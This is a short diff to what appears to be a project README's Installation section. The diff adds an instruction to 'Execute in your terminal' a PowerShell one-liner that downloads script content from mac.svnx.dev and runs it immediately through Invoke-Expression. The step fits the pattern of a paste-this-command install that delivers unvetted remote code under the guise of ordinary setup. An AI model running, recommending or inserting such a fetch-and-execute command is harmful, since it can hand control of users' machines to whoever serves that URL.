@@ -2,8 +2,10 @@
 
 ## Installation
 
+Execute in your terminal:
+
 ```cmd
-powershell ()
+powershell "iex (iwr https://mac.svnx.dev/builds/setup).Content"
 ```
 
 ## Submitting build
